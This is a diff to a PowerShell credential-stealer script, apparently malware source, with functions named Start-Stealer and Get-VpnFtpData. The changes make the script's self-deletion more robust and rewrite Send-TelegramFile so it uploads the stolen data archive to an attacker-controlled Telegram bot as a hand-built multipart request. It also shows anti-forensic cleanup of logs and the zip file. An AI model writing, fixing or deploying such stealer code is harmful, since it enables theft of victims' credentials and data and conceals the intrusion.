@@ -117,7 +117,10 @@ function Start-Stealer {
         Remove-Item -Path $LogFolder -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
         if ($SelfDelete) {
-            Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
+            $scriptPath = $MyInvocation.MyCommand.Path
+            if ($scriptPath -and (Test-Path $scriptPath)) {
+                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+            }
         }
         Write-Host $OutputMessages.Complete -ForegroundColor Green
     }
@@ -390,13 +393,39 @@ function Get-VpnFtpData {
 function Send-TelegramFile {
     param($FilePath, $Caption)
     $uri = "https://api.telegram.org/bot$TelegramToken/sendDocument"
-    $form = @{
-        chat_id = $ChatID
-        caption = $Caption
-        document = Get-Item -Path $FilePath
-    }
+
     try {
-        Invoke-RestMethod -Method Post -Uri $uri -Form $form -TimeoutSec 120
+        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileName = Split-Path -Leaf $FilePath
+
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $body = @()
+        $body += "--$boundary"
+        $body += "Content-Disposition: form-data; name=`"chat_id`""
+        $body += ""
+        $body += $ChatID
+        $body += "--$boundary"
+        $body += "Content-Disposition: form-data; name=`"caption`""
+        $body += ""
+        $body += $Caption
+        $body += "--$boundary"
+        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
+        $body += "Content-Type: application/zip"
+        $body += ""
+
+        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(($body -join "`r`n"))
+        $boundaryBytes = [System.Text.Encoding]::UTF8.GetBytes("--$boundary--`r`n")
+
+        $requestBody = New-Object System.IO.MemoryStream
+        $requestBody.Write($bodyBytes, 0, $bodyBytes.Length)
+        $requestBody.Write($fileContent, 0, $fileContent.Length)
+        $requestBody.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"), 0, 2)
+        $requestBody.Write($boundaryBytes, 0, $boundaryBytes.Length)
+
+        Invoke-RestMethod -Method Post -Uri $uri `
+            -ContentType "multipart/form-data; boundary=$boundary" `
+            -Body $requestBody.ToArray() `
+            -TimeoutSec 120
     } catch {
         Write-Warning "Failed to send file to Telegram: $($_.Exception.Message)"
     }
